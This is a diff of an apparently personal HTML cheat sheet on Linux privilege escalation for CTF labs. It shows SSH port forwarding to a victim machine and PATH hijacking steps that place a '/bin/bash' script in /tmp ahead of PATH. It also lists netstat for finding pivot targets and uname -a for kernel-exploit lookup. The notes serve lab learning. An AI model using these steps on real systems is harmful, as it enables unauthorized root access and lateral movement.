@@ -38,17 +38,21 @@
                         <h3> Important sections to check</h3>
                         <ul>
                             <h4>Active ports</h4>
-                            <p>In case you found one service in a random port that you would like to check in you attacker machine use:</p>
-                            <pre><code class="language-bash">ssh -L 8000:127.0.0.1:8000 VICTIM_USERANE@VICTIM_IP</code></pre>
+                            <ul>
+                                <p>In case you found one service in a random port that you would like to check in you attacker machine use:</p>
+                                <pre><code class="language-bash">ssh -L 8000:127.0.0.1:8000 VICTIM_USERANE@VICTIM_IP</code></pre>
+                            </ul>
+
                             <h4>Modified interesting files in the last 5mins</h4>
-                            <p> In some cases you can find interesting cronjobs in /opt</p>
+                            <ul>
+                                <p>In some cases you can find interesting cronjobs in /opt</p>
+                            </ul> 
+
+                            <h4>Backups</h4>
+                            <ul>
+                                <pre><code class="language-bash">/var/backups</code></pre>
+                            </ul>        
                         </ul>
-                        
-                        
-
-                        
-       
-
                     </ul> 
                 </div>
 
@@ -102,10 +106,10 @@
                 </div>
 
                 <div class="notion-body">
-                    <h2 id="Privielge scalation: Path">Privielge scalation: Path</h2>
+                    <h2 id="Privielge scalation: Path">Path Hijacking</h2>
                     <ul>
-                        <h3> Steps </h3>
                         <p> ⚠️WARNING!! This process may vary depending of the CTF</p>
+                        <h3> Steps </h3>
                         <h4> 1. Explore $PATH variable and look for a directory where you can write</h4>
                         <pre><code class="language-bash">echo %PATH</code></pre>
                         <h4> 2. Write a simple script</h4>
@@ -121,7 +125,7 @@ void main(){
                         <h4> 4. Find for a writeable folder under path structure</h4>
                         <pre><code class="language-bash">find / -writable 2>/dev/null</code></pre>
                         <h4> 4.1. In case you can't find a directory which is un  $PATH variable you can add your own with the following command</h4>
-                        <pre><code class="language-bash">export PATH /tmp:$PATH</code></pre>
+                        <pre><code class="language-bash">export PATH=/tmp:$PATH</code></pre>
                         <h4> 5. Create the exploit to become root, must be with the same name as the C script </h4>
                         <pre><code class="language-bash">echo "/bin/bash" > thm</code></pre>
                         <pre><code class="language-bash">chmod 777 thm</code></pre>
@@ -153,22 +157,18 @@ int main(){
                 </div>
 
 
-                <div class="notion-body">
                     <h2 id="Networking">Networking</h2>
                     <ul>
                         <h3> Check for interfaces </h3>
                         <pre><code class="language-bash">netstat -tuln</code></pre>
                         <p> In some cases you can find local services running or other targets where you can pivot </p>
                     </ul> 
-                </div>
 
-
-                <div class="notion-body">
                     <h2 id="Kernel exploits">Kernel exploits</h2>
-                    <p>Based on the information gathered during enumration phase search for kernel exploit using the <b>kernel version</b> or the <b>operating system version</b></p>
-                    <pre><code class="language-bash">uname -a</code></pre>
-                </div>
-
+                    <ul>
+                        <p>Based on the information gathered during enumration phase search for kernel exploit using the <b>kernel version</b> or the <b>operating system version</b></p>
+                        <pre><code class="language-bash">uname -a</code></pre>
+                    </ul>
         </div>
     </div>
 </body>
